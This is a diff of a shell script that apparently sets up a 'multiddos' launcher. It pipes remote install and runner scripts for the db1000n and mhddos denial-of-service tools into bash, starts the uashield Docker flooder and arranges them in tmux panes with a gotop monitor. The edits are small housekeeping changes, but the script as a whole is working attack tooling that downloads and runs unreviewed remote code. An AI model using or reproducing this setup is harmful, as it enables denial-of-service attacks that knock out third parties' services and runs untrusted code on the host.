@@ -6,6 +6,7 @@ pip install --upgrade pip
 tmux kill-session -t multiddos
 sudo pkill node
 cd ~
+rm -f multiddos
 mkdir multiddos
 cd multiddos
 curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash
@@ -13,9 +14,8 @@ if [ ! -f "/usr/local/bin/gotop" ]; then
     wget https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb
     sudo dpkg -i gotop_3.0.0_linux_amd64.deb
 fi
-rm *.tar.gz *.deb
 
-tmux new-session -s `whoami` -d 'gotop -asc solarized'
+tmux new-session -s krb -d 'gotop -asc solarized'
 tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/KarboDuck/mhddos_bash/master/runner.sh | bash'
 #tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh |  bash'
 tmux split-window -v 'docker run -it --rm  ghcr.io/opengs/uashield:master 512 true'
